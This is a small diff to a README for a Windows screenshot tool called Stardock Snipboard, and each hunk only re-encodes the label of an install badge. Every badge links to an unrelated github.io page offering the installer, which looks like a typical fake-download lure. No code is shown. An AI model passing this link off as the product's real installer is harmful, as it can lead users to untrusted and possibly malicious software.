@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Stardock Snipboard](https://img.shields.io/badge/⬇_Install_Stardock%20Snipboard-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stardock Snipboard](https://img.shields.io/badge/⬇_Install_Stardock+Snipboard-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Stardock Snipboard enhances the Windows screenshot workflow by automatically sav
 
 <div align="center">
 
-[![⬇ Install Stardock Snipboard](https://img.shields.io/badge/⬇_Install_Stardock%20Snipboard-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stardock Snipboard](https://img.shields.io/badge/⬇_Install_Stardock+Snipboard-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Stardock Snipboard enhances the Windows screenshot workflow by automatically sav
 
 <div align="center">
 
-[![⬇ Install Stardock Snipboard](https://img.shields.io/badge/⬇_Install_Stardock%20Snipboard-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stardock Snipboard](https://img.shields.io/badge/⬇_Install_Stardock+Snipboard-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
